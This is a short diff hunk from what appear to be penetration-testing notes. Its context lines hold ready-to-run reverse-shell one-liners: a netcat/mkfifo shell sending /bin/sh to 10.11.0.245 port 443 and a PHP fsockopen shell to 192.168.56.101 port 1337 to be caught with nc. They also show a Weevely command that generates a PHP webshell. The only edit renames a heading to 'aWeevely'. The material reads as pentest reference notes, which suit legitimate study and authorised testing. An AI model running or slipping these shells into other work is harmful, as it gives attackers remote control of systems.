@@ -52,7 +52,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.245 443 >/tmp/f
                 - TIP:   This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6
                    - php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
                 - The above can be connected by listening at port 1337 by using nc
-### Weevely
+### aWeevely
             - Weevely also generates a webshell
                - weevely generate password /tmp/payload.php
             - which can be called by
